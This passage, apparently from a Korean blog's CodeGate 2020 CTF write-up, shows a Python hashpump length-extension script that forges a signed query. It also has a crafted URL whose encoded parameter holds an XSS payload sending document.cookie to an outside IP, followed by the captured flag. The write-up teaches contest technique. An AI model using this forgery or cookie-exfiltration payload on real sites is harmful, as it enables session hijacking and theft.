class=\"mtk1\">,i)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;found!!!key_length!!!!!! : &quot;</span><span class=\"mtk8\">+str</span><span class=\"mtk1\">(key_len))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> key_len</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[sig, value] </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">hashpump</span><span class=\"mtk1\">(ori_sig, ori_msg, msg_1</span><span class=\"mtk8\">+</span><span class=\"mtk1\">msg_2</span><span class=\"mtk8\">+</span><span class=\"mtk1\">msg_3, </span><span class=\"mtk7\">12</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\"># [sig, value] = os.popen(&quot;hashpump -s &#39;{s}&#39; -d &#39;{d}&#39; -a &#39;{a}&#39; -k {k}&quot;.format(s=ori_sig, d=ori_msg, a=msg_1+msg_2+msg_3, k=12)).read().strip().split(&#39;\\n&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;q&#39;</span><span class=\"mtk1\"> : </span><span class=\"mtk3\">b64encode</span><span class=\"mtk1\">(value).</span><span class=\"mtk3\">decode</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk6\">&#39;sig&#39;</span><span class=\"mtk1\"> : sig}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">print</span><span class=\"mtk1\">(url</span><span class=\"mtk8\">+</span><span class=\"mtk6\">&quot;?q=</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&amp;sig=</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(params[</span><span class=\"mtk6\">&#39;q&#39;</span><span class=\"mtk1\">],params[</span><span class=\"mtk6\">&#39;sig&#39;</span><span class=\"mtk1\">]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\"># response = requests.get(url,params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\"># print(response.text)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\"># print(response.url)</span></span></span></code></pre>\n<p>다시 한번 스크립트를 돌려봅니다.</p>\n<p><a href=\"http://110.10.147.166/api.php?q=WW05a2VRPT0sN1l5QTY2cW82NUdRSVE9PSyAAAAAAAAAAAAAAAAAAAAAAAAwAQAAAAAAAHxhR1ZoWkdWeSxhSFIwY0M4eExqRT0sTkRBMHxZbTlrZVE9PSxQSE5qY21sd2RBbytaRzlqZFcxbGJuUXViRzlqWVhScGIyNDlJbWgwZEhBNkx5OHlOeTQ1Tmk0eE16VXVNVFEwTDJOdmIydHBaVDlqYjI5cmFXVTlJaXRrYjJOMWJXVnVkQzVqYjI5cmFXVTdDand2YzJOeWFYQjBDajQ9LHxZMjl2YTJsbCxZMjl2YTJsbGN5RT0sN1l5QTY2cW82NUdRSU8yWmxPeWR0TzJNaFNFPQ==&#x26;sig=7654fbf53d260c2176bf0122ed1b0b35\">http://110.10.147.166/api.php?q=WW05a2VRPT0sN1l5QTY2cW82NUdRSVE9PSyAAAAAAAAAAAAAAAAAAAAAAAAwAQAAAAAAAHxhR1ZoWkdWeSxhSFIwY0M4eExqRT0sTkRBMHxZbTlrZVE9PSxQSE5qY21sd2RBbytaRzlqZFcxbGJuUXViRzlqWVhScGIyNDlJbWgwZEhBNkx5OHlOeTQ1Tmk0eE16VXVNVFEwTDJOdmIydHBaVDlqYjI5cmFXVTlJaXRrYjJOMWJXVnVkQzVqYjI5cmFXVTdDand2YzJOeWFYQjBDajQ9LHxZMjl2YTJsbCxZMjl2YTJsbGN5RT0sN1l5QTY2cW82NUdRSU8yWmxPeWR0TzJNaFNFPQ==&#x26;sig=7654fbf53d260c2176bf0122ed1b0b35</a></p>\n<p>이제 완성된 링크를 report에 제출합니다.</p>\n<p>그리고 이제 웹 서버로 들어가 파일을 확인 합니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 927px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA2klEQVQY04WQ646CMBSE+xxQCtgLCihslLW4uoqa8P5PNJ5TXUM2YffHl5metNNphf/yqOoVtF6gKGtImSCKIlL5Jo7jWR9P9jHi+3qjwDX0QiNVEgkNk+QZGg68Aua8nHoOHK539IcD2rbFdrfH576HKwpkWRaQvxr8hxjHEafTETW13HzsUK0bOLdE02ywpGC+fdp2zv8ghmFAVZbI8xyKniqlQppyu5T0CTf9yyulAvxV4ny+wHuPrutIe9yPFcqVhbWOmloYY8jbgHMuKM8YXhujQ3AoRKEP0teoPTgahuwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image-20200214035820505\"\n        title=\"image-20200214035820505\"\n        src=\"/static/67598ab5e132fb3c88afe8e2be7260e8/e4374/image-20200214035820505.png\"\n        srcset=\"/static/67598ab5e132fb3c88afe8e2be7260e8/5a46d/image-20200214035820505.png 300w,\n/static/67598ab5e132fb3c88afe8e2be7260e8/0a47e/image-20200214035820505.png 600w,\n/static/67598ab5e132fb3c88afe8e2be7260e8/e4374/image-20200214035820505.png 927w\"\n        sizes=\"(max-width: 927px) 100vw, 927px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">CODEGATE2020{CSP_m34n5_Content-Success-Policy_n0t_Security}</span></span></code></pre>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .one-dark-pro {\n    background-color: #282c34;\n    color: #abb2bf;\n  }\n  .one-dark-pro .mtki { font-style: italic; }\n  .one-dark-pro .mtk8 { color: #56B6C2; }\n  .one-dark-pro .mtk10 { color: #C678DD; }\n  .one-dark-pro .mtk7 { color: #D19A66; }\n  .one-dark-pro .mtk1 { color: #ABB2BF; }\n  .one-dark-pro .mtk6 { color: #98C379; }\n  .one-dark-pro .mtk4 { color: #E06C75; }\n  .one-dark-pro .mtk5 { color: #7F848E; }\n  .one-dark-pro .mtk3 { color: #61AFEF; }\n  .one-dark-pro .mtk11 { color: #E5C07B; }\n  .one-dark-pro .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>","tableOfContents":"","frontmatter":{"date":"2020년 02월 13일","title":"CodeGate - writeUp - csp(web)","tags":["xss","CODEGATE","webhakcing","length extension attack","csp bypass"]}}},"pageContext":{"slug":"/Writeup/CodeGate-writeup-csp_web/","previous":{"fields":{"slug":"/Python/python-Selenium을-이용한-웹-크롤링-Naver-login-후-구독-Feed-크롤링/"},"frontmatter":{"title":"[python] Selenium을 이용한 웹 크롤링 - Naver login 후 구독 Feed 크롤링"}},"next":{"fields":{"slug":"/Security/nodejs-HTTP-request-splitting을-이용한-SSRF-취약점featNullCon2020-splitsecond-WriteUp/"},"frontmatter":{"title":"[node.js] : HTTP request splitting을 이용한 SSRF 취약점(feat.NullCon_2020-split_second WriteUp)"}}}},"staticQueryHashes":["1081905842","63159454"]}